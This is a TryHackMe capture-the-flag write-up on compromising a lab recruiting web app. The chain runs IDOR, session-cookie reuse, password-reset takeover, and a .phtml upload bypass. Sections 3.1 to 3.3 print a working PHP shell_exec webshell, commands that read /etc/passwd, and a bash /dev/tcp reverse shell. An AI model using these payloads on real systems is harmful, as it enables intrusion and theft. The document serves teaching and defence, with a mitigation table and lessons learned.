# RecruitX v2.4 — TryHackMe

**Platform:** TryHackMe
**Machine:** RecruitX v2.4
**Difficulty:** Not stated by the room
**OS:** Linux (Ubuntu, kernel 6.8.0-1017-aws)
**Date:** 20/07/2026
**Tags:** #recon #web #api #idor #rce #fileupload
**Status:** Foothold obtained as `www-data` (no privilege escalation to root documented in this writeup)

## TL;DR

The application is a recruiting system (**RecruitX v2.4**) running on a LAMP stack (Apache + PHP + MySQL). Initial recon revealed an API that **lists its own endpoints** (`/api/user`, `/api/jobs`, `/api/applications`), which already makes backend mapping considerably easier. From there, an **IDOR** on `profile.php?id=` allowed viewing other users' profiles simply by changing the `id` parameter in the URL — including an administrator's, whose session cookie (`PHPSESSID`) was exposed in the rendered HTML and could be reused directly in `curl` requests.

Combining the API IDOR (`/api/user?id=`) to enumerate user emails with the **password reset** flow (`reset.php`), it was possible to take over the administrator's account without cracking any password. This granted access to an admin panel with a **file upload** feature whose extension filter blocked `.php` but not `.phtml` — an extension Apache also interprets as PHP. Uploading a `.phtml` file containing `shell_exec()` resulted in **RCE** as `www-data`, confirmed via `whoami`/`id`/`uname -a`, followed by reading `/etc/passwd` and obtaining an interactive reverse shell.

**Attack chain:** API enumeration/IDOR → Admin session cookie disclosure → Account takeover via password reset → Upload filter bypass (`.phtml`) → RCE (www-data) → Reverse shell

---

## 1. Recon

### 1.1 Port scan

```
nmap -sV -sC -p- 10.64.150.106
```

4 open ports identified:

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 9.6p1 |
| 80 | HTTP | Apache httpd 2.4.58 |
| 3306 | MySQL | — |
| 8080 | HTTP | Apache httpd 2.4.58 |

### 1.2 Web server fingerprint

```
curl -I http://10.64.150.106
```

Confirms the Apache version and returns a session cookie: `PHPSESSID=bhgauo9udn2lo1gd3fohalvpn1`.

### 1.3 Directory enumeration with Gobuster

```
gobuster dir -u http://10.64.150.106 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Directories/files found:

```
/.php
/index.php
/login.php
/register.php
/profile.php
/jobs.php
/uploads
/data
/admin
/test
/includes
/api
/logout.php
/config
/dashboard.php
/reset.php
```

Several points of interest: `/api`, `/admin`, `/uploads`, and `/reset.php` — all exploited in the following steps.

### 1.4 API enumeration

```
curl http://10.65.140.154/api/
```

```json
{"endpoints":["\/api\/user","\/api\/jobs","\/api\/applications"]}
```

The API itself exposes the list of its internal endpoints. This is already a design flaw — a client shouldn't be able to discover internal routes just by hitting the API root; it drastically reduces the enumeration effort required from an attacker.

---

## 2. IDOR and account takeover

### 2.1 IDOR on `profile.php`

While viewing my own authenticated profile, the URL carried `id=6`. Changing the parameter to `id=1` revealed the profile and information of **Sarah Mitchell**, the system administrator (`s.mitchell@recruitx.thm`) — no check that the URL's `id` belongs to the authenticated user.

Inspecting the page, it was possible to capture the administrator's session cookie: `PHPSESSID=sbt3vd2o09tfr36am59qkm618d`.

Reusing that cookie directly in a `curl` request against `id=1` confirms the account access:

```
┌──(gabriel㉿gabriel)-[~]
└─$ curl -s -b "PHPSESSID=sbt3vd2o09tfr36am59qkm618d" "http://10.65.184.108/profile.php?id=1" | grep "fw-semibold"
                        <div class="fw-semibold mt-1">Sarah Mitchell</div>
                        <div class="fw-semibold mt-1 mono">s.mitchell@recruitx.thm</div>
                        <div class="fw-semibold mt-1">March 24, 2026</div>
```

### 2.2 User enumeration via the API

The same IDOR issue exists on the `/api/user?id=` endpoint, with no authentication required:

```
┌──(gabriel㉿gabriel)-[~]
└─$ curl -s "http://10.65.184.108/api/user?id=2"
{"id":2,"name":"James Crawford","email":"j.crawford@recruitx.thm","role":"hiring_manager","created":"2026-03-24"}
┌──(gabriel㉿gabriel)-[~]
└─$ curl -s "http://10.65.184.108/api/user?id=3"
{"id":3,"name":"Priya Desai","email":"p.desai@recruitx.thm","role":"hiring_manager","created":"2026-03-24"}
┌──(gabriel㉿gabriel)-[~]
└─$ curl -s "http://10.65.184.108/api/user?id=4"
{"id":4,"name":"Tom Beckett","email":"t.beckett@recruitx.thm","role":"candidate","created":"2026-03-24"}
```

This allows enumerating emails and roles (`role`) for every user in the system — including the administrator's email, already identified in the previous step.

### 2.3 Account takeover via `reset.php`

With the administrator's email in hand (`s.mitchell@recruitx.thm`), I used the password reset flow at `/reset.php` to change the account's password and log in as the administrator — without cracking any credential.

---

## 3. RCE via upload filter bypass

### 3.1 Identifying the extension bypass

Now authenticated as the administrator, the upload panel became accessible. Inspecting the front end, the extension filter blocks `.php` but accepts `.txt` — and, critically, also accepts `.phtml`, an extension Apache also interprets as a PHP script by default.

Uploaded file (`exec.phtml`):

```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

### 3.2 Confirming remote code execution

```
┌──(gabriel㉿gabriel)-[~/Documents/Study]
└─$ curl "http://10.65.184.108/uploads/documents/exec.phtml?cmd=whoami"
<pre>www-data
</pre>
┌──(gabriel㉿gabriel)-[~/Documents/Study]
└─$ curl "http://10.65.184.108/uploads/documents/exec.phtml?cmd=id"
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
┌──(gabriel㉿gabriel)-[~/Documents/Study]
└─$ curl "http://10.65.184.108/uploads/documents/exec.phtml?cmd=hostname"
<pre>recruitx-prod
</pre>
┌──(gabriel㉿gabriel)-[~/Documents/Study]
└─$ curl "http://10.65.184.108/uploads/documents/exec.phtml?cmd=uname+-a"
<pre>Linux recruitx-prod 6.8.0-1017-aws #18-Ubuntu SMP Wed Oct  2 20:17:03 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
</pre>
```

RCE confirmed as `www-data`. Next, reading sensitive system files:

```
┌──(gabriel㉿gabriel)-[~/Documents/Study]
└─$ curl "http://10.65.184.108/uploads/documents/exec.phtml?cmd=cat+/etc/passwd" | grep -v "nologin"
<pre>root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
dhcpcd:x:114:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
mysql:x:115:123:MySQL Server,,,:/nonexistent:/bin/false
qa:x:1001:1001::/home/qa:/bin/bash
</pre>
```

### 3.3 Reverse shell

Listener in one terminal:

```
nc -lvnp 4444
```

Triggering the reverse shell through the already-uploaded webshell:

```
┌──(gabriel㉿gabriel)-[~/Documents/Study]
└─$ curl "http://10.65.184.108/uploads/documents/exec.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.155.175/4444+0>%261'"
```

Shell received on the listener:

```
┌──(gabriel㉿gabriel)-[~/Documents/Study]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.155.175] from (UNKNOWN) [10.65.184.108] 52768
bash: cannot set terminal process group (827): Inappropriate ioctl for device
bash: no job control in this shell
www-data@recruitx-prod:/var/www/recruitx/uploads/documents$
```

This writeup ends at this point (interactive access as `www-data`), with no documented privilege escalation step to root.

---

## 4. Root cause & mitigation

| # | Vulnerability | Root cause | Mitigation |
|---|---|---|---|
| 1 | Self-describing API (endpoint enumeration) | The `/api/` root returns the full list of internal endpoints with no authentication required | Never publicly expose an "index" of internal routes; require authentication/authorization for endpoint discovery, or remove it from the production build |
| 2 | IDOR on `profile.php` and `/api/user` | The `id` supplied in the URL/query string is used directly to fetch and render any user's data, with no check that it belongs to the authenticated session | Validate on the backend that the requested resource belongs to the authenticated user (or that they have explicit permission); use non-sequential identifiers (UUID) to make enumeration harder |
| 3 | Session cookie leaked in HTML | Another user's `PHPSESSID` was exposed/reusable simply by viewing that user's profile via the IDOR | Session cookies should carry `HttpOnly`, `Secure`, and `SameSite` attributes; a session should never "leak" just from viewing another user's data through an IDOR — this points to a deeper session-design flaw |
| 4 | Account takeover via password reset | The `/reset.php` flow lets anyone initiate a password reset for any account just by knowing the email (obtained via the API IDOR) | Require proof of email ownership (a unique link/token delivered to the real inbox), rate limiting, and never allow valid-email enumeration through a public API |
| 5 | Upload filter bypass by extension (`.phtml`) | The upload filter only blocks `.php`, ignoring other extensions (`.phtml`, `.php5`, `.pht`, etc.) that Apache also interprets as PHP | Use a strict extension whitelist plus real content validation (magic bytes/actual MIME type); configure Apache/`AddHandler` to not interpret extensions beyond the strictly necessary ones, and serve uploads outside the webroot or without execute permission |

---

## 5. Lessons learned

- An API that exposes its own endpoints at the root makes an attacker's reconnaissance far too easy — it reduces attack-surface mapping to a single `curl`.
- IDOR isn't "just" about viewing another user's data: in this case it chained directly into session-cookie disclosure and then into account takeover via password reset — small flaws combine into much larger impact chains.
- Extension blacklisting (blocking `.php` but forgetting `.phtml`, `.php5`, `.pht`) is a fragile approach; always prefer whitelisting plus real content validation.
- Knowing the backend was PHP avoided wasting time on bypasses aimed at Node or Python — `.phtml` is an easily-forgotten variant, yet fully executable by Apache out of the box.
- Recon isn't just "collecting for the sake of collecting": every directory, endpoint, and cookie found in this phase was reused in the later stages of the attack.
